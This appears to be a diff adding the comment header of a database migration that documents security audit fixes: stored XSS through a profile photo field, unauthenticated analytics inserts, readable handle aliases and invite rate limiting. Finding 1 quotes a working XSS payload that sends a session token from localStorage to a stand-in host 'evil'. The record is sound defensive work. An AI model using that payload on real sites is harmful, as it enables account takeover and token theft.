@@ -1,0 +1,37 @@
+-- 2026-09-19 — Security audit remediation (database half)
+--
+-- FINDING 1 (CRITICAL) — stored XSS via profiles.photo -> account takeover.
+-- photo was interpolated raw into src="..." at nine render sites, and
+-- profiles_update lets a user PATCH their own photo to any string. A value of
+--   x" onerror="fetch('//evil/'+localStorage.getItem('sb-...-auth-token'))
+-- broke out of the attribute and ran in the browser of every user who saw that
+-- avatar. Tokens live in localStorage, so that is full account takeover, and
+-- wormable (the stolen session can set the victim's own photo).
+-- Proven by execution before the fix, and proven inert after.
+-- The render sites now escape; profiles_photo_is_safe / groups_photo_is_safe
+-- are the second layer so a future unescaped site cannot receive a payload.
+-- Constraints are NOT VALID on purpose: they apply to new writes without
+-- rejecting historical rows, which would blank real avatars.
+--
+-- FINDING 5 (MEDIUM) — analytics_events accepted unauthenticated inserts
+-- (WITH CHECK true). Anyone with the publishable key, which ships in the page
+-- source by design, could write unlimited rows with no account: free storage
+-- exhaustion plus poisoned analytics. Now authenticated-only and attributed to
+-- the caller.
+--
+-- FINDING 8 (LOW) — handle_aliases was world-readable, letting anyone map an
+-- old handle to the current account. Authenticated only.
+--
+-- FINDING 9 (LOW) — no application rate limiting. list_share_invites is the
+-- one insert that mails ANOTHER person, so a single account could mail every
+-- user repeatedly, burning Resend quota and sender reputation. Enforced with a
+-- trigger rather than in the client so it holds against direct PostgREST
+-- calls. Background jobs (service role, no auth.uid) are exempt — verified.
+--
+-- Verified, each rolled back: XSS payload REJECTED while a real CDN URL and a
+-- base64 data URL are still accepted; anon analytics write BLOCKED while a
+-- signed-in own-attributed write is allowed; anon handle_aliases read BLOCKED;
+-- 40 scripted invites BLOCKED at attempt 31.
+
+-- (applied as: harden_photo_and_analytics, rate_limit_outbound_invites,
+--  rate_limit_message_fix)
